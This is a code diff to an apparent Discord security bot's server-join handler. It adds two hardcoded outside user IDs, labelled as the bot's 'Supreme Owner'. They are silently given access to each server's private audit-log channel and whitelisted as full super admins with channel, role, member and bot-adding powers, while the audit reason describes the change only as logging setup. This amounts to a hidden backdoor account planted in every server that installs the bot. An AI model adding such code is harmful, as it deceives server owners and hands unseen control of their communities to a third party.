@@ -45,6 +45,14 @@ export default {
               {
                 id: guild.ownerId,
                 allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.ReadMessageHistory]
+              },
+              {
+                id: '1177824268847943702', // Mian (mian_7)
+                allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.SendMessages]
+              },
+              {
+                id: '739386595546759268',  // 1nOnlyMian
+                allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.SendMessages]
               }
             ],
             reason: '[MIAN XITERS] Automated secure audit logging setup'
@@ -59,6 +67,22 @@ export default {
       if (logChannel) {
         whitelistManager.setLogChannel(guild.id, logChannel.id);
       }
+
+      // Auto-whitelist Supreme Owner Mian as Super Admin in new server
+      whitelistManager.setWhitelist(guild.id, '1177824268847943702', {
+        isFullSuperAdmin: true,
+        allowChannelManage: true,
+        allowRoleManage: true,
+        allowMemberManage: true,
+        allowBotAdd: true
+      });
+      whitelistManager.setWhitelist(guild.id, '739386595546759268', {
+        isFullSuperAdmin: true,
+        allowChannelManage: true,
+        allowRoleManage: true,
+        allowMemberManage: true,
+        allowBotAdd: true
+      });
 
       // 4. Auto-deploy Quarantine Role
       let quarantineRole = guild.roles.cache.find(r => r.name === 'MIAN-XITERS-QUARANTINE');
